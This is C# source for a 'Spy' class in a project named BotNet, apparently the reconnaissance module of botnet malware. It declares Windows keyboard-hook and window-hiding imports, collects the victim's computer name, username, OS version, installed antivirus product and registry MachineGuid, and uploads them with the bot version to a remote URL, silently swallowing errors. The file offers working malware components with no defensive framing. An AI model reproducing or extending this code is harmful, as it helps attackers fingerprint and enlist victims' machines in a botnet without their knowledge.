using System;
using System.Management;
using System.Net;
using System.Collections.Specialized;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32;

namespace BotNet.Services
{
    public class Spy
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        const int SW_HIDE = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        public static string pcname;
        public static string username;
        public static string osname;
        public static string osarch;
        public static string osvers;
        public static string machineguid;
        public static string avname = "Undefined";
        public static void SystemInfo(string url)
        {
            try
            {
                Resolver.RegisterDependencyResolver();
                try
                {
                    Spy si = new Spy();
                    si.getOperatingSystemInfo();
                    var searcher = new ManagementObjectSearcher("root\\SecurityCenter2",
                                                     "SELECT * FROM AntiVirusProduct");
                    si.GetMachineGuid();

                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        string displayName = (string)queryObj["displayName"];
                        avname = $"Antivirus: {displayName}";
                        if (avname == null || avname == "") avname = "null";

                        uint productState = (uint)queryObj["productState"];
                        uint secutityProvider = (productState & 0xff0000) >> 16;

                        uint realtimeStatus = (productState & 0xff00) >> 8;
                        uint signatureStatus = (productState & 0xff);
                        switch (signatureStatus)
                        {
                            case 0x00:
                                break;
                            case 0x10:
                                break;
                            default:
                                break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Op: 3 \n" + ex.ToString());
                }

                WebClient cl = new WebClient();
                var values = new NameValueCollection();
                values["sysinfo"] = pcname;
                values["pcname"] = pcname;
                values["username"] = username;
                values["sysinfo"] = osname + " " + osvers + " " + osarch;
                values["avname"] = avname;
                values["machineguid"] = machineguid;
                values["version"] = BotNet.Configure.BotVersion;
                var upload = cl.UploadValues(url, values); 
                var result = Encoding.Default.GetString(upload);
                //Console.WriteLine("Complete"); 
            }
            catch //(Exception ex)
            {
                //Console.WriteLine(ex.ToString()); 
            }
        }

        public void getOperatingSystemInfo() 
        {
            try
            {
                pcname = Environment.MachineName;
                username = Environment.UserName; 
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    if (managementObject["Caption"] != null)
                    {
                        osname = managementObject["Caption"].ToString();
                    }
                    if (managementObject["OSArchitecture"] != null)
                    {
                        osarch = managementObject["OSArchitecture"].ToString();
                    }
                    if (managementObject["CSDVersion"] != null)
                    {
                        osvers = managementObject["CSDVersion"].ToString();
                    }
                }
            }
            catch //(Exception ex)
            {
               //Console.WriteLine(ex.ToString());
            }
        }
        public void GetMachineGuid()
        {
            string location = @"SOFTWARE\Microsoft\Cryptography";
            string name = "MachineGuid";

            using (RegistryKey localMachineX64View =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey rk = localMachineX64View.OpenSubKey(location))
                {
                    object machineGuid = rk.GetValue(name);
                    machineguid = machineGuid.ToString();
                }
            }
        }
    }
}